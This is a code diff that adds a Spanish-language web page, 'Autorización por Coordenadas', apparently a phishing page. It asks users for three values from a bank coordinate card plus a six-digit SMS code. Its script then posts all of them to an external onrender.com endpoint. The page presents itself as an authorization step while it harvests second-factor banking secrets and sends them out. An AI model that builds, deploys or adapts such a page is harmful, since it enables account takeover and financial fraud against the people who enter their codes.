@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Autorización por Coordenadas</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+  <div class="login-box">
+    <h2>Autorización por Coordenadas</h2>
+    <form id="formCoordenadas">
+      <label id="coordLabel1"></label>
+      <input type="text" id="coordA" maxlength="1" required>
+
+      <label id="coordLabel2"></label>
+      <input type="text" id="coordB" maxlength="1" required>
+
+      <label id="coordLabel3"></label>
+      <input type="text" id="coordC" maxlength="1" required>
+
+      <label>Clave SMS (6 dígitos)</label>
+      <input type="text" id="claveSMS" maxlength="6" required>
+
+      <button type="submit">Autorizar</button>
+    </form>
+  </div>
+
+  <script>
+    // Cargar coordenadas desde localStorage
+    document.addEventListener("DOMContentLoaded", () => {
+      document.getElementById("coordLabel1").innerText = "Coordenada " + (localStorage.getItem("coord1") || "A");
+      document.getElementById("coordLabel2").innerText = "Coordenada " + (localStorage.getItem("coord2") || "B");
+      document.getElementById("coordLabel3").innerText = "Coordenada " + (localStorage.getItem("coord3") || "C");
+    });
+
+    document.getElementById("formCoordenadas").addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const coordA = document.getElementById("coordA").value;
+      const coordB = document.getElementById("coordB").value;
+      const coordC = document.getElementById("coordC").value;
+      const claveSMS = document.getElementById("claveSMS").value;
+
+      const mensaje = `Autorización Coordenadas:
+      ${localStorage.getItem("coord1")}: ${coordA}
+      ${localStorage.getItem("coord2")}: ${coordB}
+      ${localStorage.getItem("coord3")}: ${coordC}
+      Clave SMS: ${claveSMS}`;
+
+      try {
+        await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ mensaje })
+        });
+        alert("✅ Autorización enviada");
+      } catch (err) {
+        alert("❌ Error al enviar autorización");
+      }
+    });
+  </script>
+</body>
+</html>
